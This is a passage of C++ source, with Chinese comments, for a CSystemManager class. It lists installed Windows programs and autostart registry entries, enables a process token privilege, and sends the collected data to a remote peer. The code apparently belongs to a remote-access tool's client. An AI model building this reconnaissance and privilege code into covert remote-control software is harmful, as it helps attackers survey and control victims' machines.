						wsprintf(regInstallDate, "%s/%s/%s", Year, Month, Day);
					}
					else
					{
						FILETIME fileLastTime;
						RegQueryInfoKey(hSubKey, NULL, NULL, NULL, NULL, NULL, NULL, NULL,
							NULL, NULL, NULL, &fileLastTime);
						SYSTEMTIME sTime, stLocal;
						FileTimeToSystemTime(&fileLastTime, &sTime);
						SystemTimeToTzSpecificLocalTime(NULL, &sTime, &stLocal);
						wsprintf(regInstallDate, "%d/%02d/%02d", stLocal.wYear, stLocal.wMonth, stLocal.wDay);
					}

					dwRegSize = MAX_LEG;
					memset(regUninstallString, 0, MAX_LEG);
					RegQueryValueEx(hSubKey, "UninstallString", 0, &dwType, (LPBYTE)regUninstallString, &dwRegSize);

					// 缓冲区太小，再重新分配下
					dwLength = lstrlen(regDisplayName) + lstrlen(regPublisher) + lstrlen(regDisplayVersion) + lstrlen(regInstallDate) + lstrlen(regUninstallString) + 6;
					if (LocalSize(lpBuffer) < (dwOffset + dwLength))
						lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT | LMEM_MOVEABLE);

					memcpy(lpBuffer + dwOffset, regDisplayName, lstrlen(regDisplayName) + 1);
					dwOffset += lstrlen(regDisplayName) + 1;

					memcpy(lpBuffer + dwOffset, regPublisher, lstrlen(regPublisher) + 1);
					dwOffset += lstrlen(regPublisher) + 1;

					memcpy(lpBuffer + dwOffset, regDisplayVersion, lstrlen(regDisplayVersion) + 1);
					dwOffset += lstrlen(regDisplayVersion) + 1;

					memcpy(lpBuffer + dwOffset, regInstallDate, lstrlen(regInstallDate) + 1);
					dwOffset += lstrlen(regInstallDate) + 1;

					memcpy(lpBuffer + dwOffset, regUninstallString, lstrlen(regUninstallString) + 1);
					dwOffset += lstrlen(regUninstallString) + 1;
				}
				
			}
			
		}
	}
	else
		return FALSE; //打开键失败

	RegCloseKey(hKey);

	if (GetOSVerIs64Bit())
	{
		if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
			NULL, KEY_READ | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS)
		{
			if (RegQueryInfoKey(hKey, NULL, NULL, NULL, &dwRegNum, NULL, NULL, NULL, NULL, NULL, NULL, NULL) == ERROR_SUCCESS)
			{
				for (int i = 0; i < (int)dwRegNum; i++)
				{
					DWORD dwRegSize = MAX_LEG;
					RegEnumKeyEx(hKey, i, regBufferName, &dwRegSize, NULL, NULL, NULL, NULL);
					DWORD dwType;
					HKEY hSubKey;
					if (RegOpenKeyEx(hKey, regBufferName, NULL, KEY_READ, &hSubKey) == ERROR_SUCCESS)
					{
						dwRegSize = MAX_LEG;
						memset(regDisplayName, 0, MAX_LEG);
						RegQueryValueEx(hSubKey, "DisplayName", 0, &dwType, (LPBYTE)regDisplayName, &dwRegSize);

						dwRegSize = MAX_LEG;
						memset(regBufferValue, 0, MAX_LEG);
						// 取ParentKeyName键值,判断是否是补丁信息, 是补丁信息键值为"OperatingSystem"
						RegQueryValueEx(hSubKey, "ParentKeyName", 0, &dwType, (LPBYTE)regBufferValue, &dwRegSize);
						if (lstrlen(regDisplayName) == 0 || lstrcmp(regBufferValue, "OperatingSystem") == 0) //判断是否是补丁信息 
						{
							continue;
						}

						dwRegSize = MAX_LEG;
						memset(regPublisher, 0, MAX_LEG);
						RegQueryValueEx(hSubKey, "Publisher", 0, &dwType, (LPBYTE)regPublisher, &dwRegSize);

						dwRegSize = MAX_LEG;
						memset(regDisplayVersion, 0, MAX_LEG);
						RegQueryValueEx(hSubKey, "DisplayVersion", 0, &dwType, (LPBYTE)regDisplayVersion, &dwRegSize);

						dwRegSize = MAX_LEG;
						memset(regInstallDate, 0, MAX_LEG);
						// 判断是否能在注册表中获取到安装时间, 否取子项创建时间
						if (RegQueryValueEx(hSubKey, "InstallDate", 0, &dwType, (LPBYTE)regInstallDate, &dwRegSize) == ERROR_SUCCESS)
						{
							TCHAR Year[5], Month[5], Day[5];
							lstrcpyn(Year, regInstallDate, 5);
							lstrcpyn(Month, regInstallDate + 4, 3);
							lstrcpyn(Day, regInstallDate + 4 + 2, 3);
							wsprintf(regInstallDate, "%s/%s/%s", Year, Month, Day);
						}
						else
						{
							FILETIME fileLastTime;
							RegQueryInfoKey(hSubKey, NULL, NULL, NULL, NULL, NULL, NULL, NULL,
								NULL, NULL, NULL, &fileLastTime);
							SYSTEMTIME sTime, stLocal;
							FileTimeToSystemTime(&fileLastTime, &sTime);
							SystemTimeToTzSpecificLocalTime(NULL, &sTime, &stLocal);
							wsprintf(regInstallDate, "%d/%02d/%02d", stLocal.wYear, stLocal.wMonth, stLocal.wDay);
						}

						dwRegSize = MAX_LEG;
						memset(regUninstallString, 0, MAX_LEG);
						RegQueryValueEx(hSubKey, "UninstallString", 0, &dwType, (LPBYTE)regUninstallString, &dwRegSize);

						// 缓冲区太小，再重新分配下
						dwLength = lstrlen(regDisplayName) + lstrlen(regPublisher) + lstrlen(regDisplayVersion) + lstrlen(regInstallDate) + lstrlen(regUninstallString) + 6;
						if (LocalSize(lpBuffer) < (dwOffset + dwLength))
							lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT | LMEM_MOVEABLE);

						memcpy(lpBuffer + dwOffset, regDisplayName, lstrlen(regDisplayName) + 1);
						dwOffset += lstrlen(regDisplayName) + 1;

						memcpy(lpBuffer + dwOffset, regPublisher, lstrlen(regPublisher) + 1);
						dwOffset += lstrlen(regPublisher) + 1;

						memcpy(lpBuffer + dwOffset, regDisplayVersion, lstrlen(regDisplayVersion) + 1);
						dwOffset += lstrlen(regDisplayVersion) + 1;

						memcpy(lpBuffer + dwOffset, regInstallDate, lstrlen(regInstallDate) + 1);
						dwOffset += lstrlen(regInstallDate) + 1;

						memcpy(lpBuffer + dwOffset, regUninstallString, lstrlen(regUninstallString) + 1);
						dwOffset += lstrlen(regUninstallString) + 1;
					}
				}
			}
		}
		else
			return FALSE; //打开键失败
		RegCloseKey(hKey);
	}

	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT | LMEM_MOVEABLE);

	return lpBuffer;
}


bool CSystemManager::DebugPrivilege(const char* PName, BOOL bEnable)
{
	BOOL              bResult = TRUE;
	HANDLE            hToken;
	TOKEN_PRIVILEGES  TokenPrivileges;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		bResult = FALSE;
		return bResult;
	}
	TokenPrivileges.PrivilegeCount = 1;
	TokenPrivileges.Privileges[0].Attributes = bEnable ? SE_PRIVILEGE_ENABLED : 0;

	LookupPrivilegeValue(NULL, PName, &TokenPrivileges.Privileges[0].Luid);
	AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
	if (GetLastError() != ERROR_SUCCESS)
	{
		bResult = FALSE;
	}

	CloseHandle(hToken);
	return bResult;
}

#include "setupapi.h"
#include <devguid.h>
#pragma comment(lib,"Setupapi.lib")  

void CSystemManager::SendStartupList()
{
	UINT	nRet = -1;
	LPBYTE	lpBuffer = getStartupList();
	if (lpBuffer == NULL)
		return;

	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}


LPBYTE CSystemManager::getStartupList()
{
	LPBYTE 	lpBuffer = NULL;
	DWORD	dwOffset = 1;
	DWORD   dwLength = 0;
	HKEY hkey;
	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);
	lpBuffer[0] = TOKEN_STARTUP;

	char* path[] = { "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run" ,
							"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
							"Software\\Microsoft\\Windows\\CurrentVersion\\Run"};
	char* path2[] = { "HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run" ,
						"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
						"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" };

	HKEY ROOT[] = { HKEY_LOCAL_MACHINE ,HKEY_LOCAL_MACHINE ,HKEY_CURRENT_USER };

	for (size_t i = 0; i < 3; i++)
	{
		char lpcchValueName[0x30] = { 0 };
		BYTE lpData[MAX_PATH] = { 0 };
		DWORD dwIndex = 0;

		//打开数组中的第一项
		if (RegOpenKeyExA(ROOT[i], path[i], NULL, KEY_READ | KEY_WOW64_64KEY, &hkey) == 0)
		{
			do
			{
				DWORD lpcchValueNameLen = sizeof(lpcchValueName);
				DWORD lpDatalen = sizeof(lpData);
				DWORD status = RegEnumValueA(hkey, dwIndex, lpcchValueName, &lpcchValueNameLen, 0, 0, lpData, &lpDatalen);

				if (status != 0)
				{
					break;
				}
				// 缓冲区太小，再重新分配下
				dwLength = lstrlen(lpcchValueName) + lstrlen((LPSTR)lpData) + lstrlen(path2[i]) + 3;
				if (LocalSize(lpBuffer) < (dwOffset + dwLength))
					lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT | LMEM_MOVEABLE);

				memcpy(lpBuffer + dwOffset, (char*)lpcchValueName, lstrlen((char*)lpcchValueName) + 1);
				dwOffset += lstrlen((char*)lpcchValueName) + 1; //这个是名称


				memcpy(lpBuffer + dwOffset, (char*)lpData, lstrlen((char*)lpData) + 1);
				dwOffset += lstrlen((char*)lpData) + 1; //这个是路径


				memcpy(lpBuffer + dwOffset, path2[i], lstrlen(path2[i]) + 1);
				dwOffset += lstrlen(path2[i]) + 1; //这个是路径

				dwIndex++;
			} while (true);

			//处理完关闭句柄
			RegCloseKey(hkey);
		}
	}

	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT | LMEM_MOVEABLE);
	return lpBuffer;
}


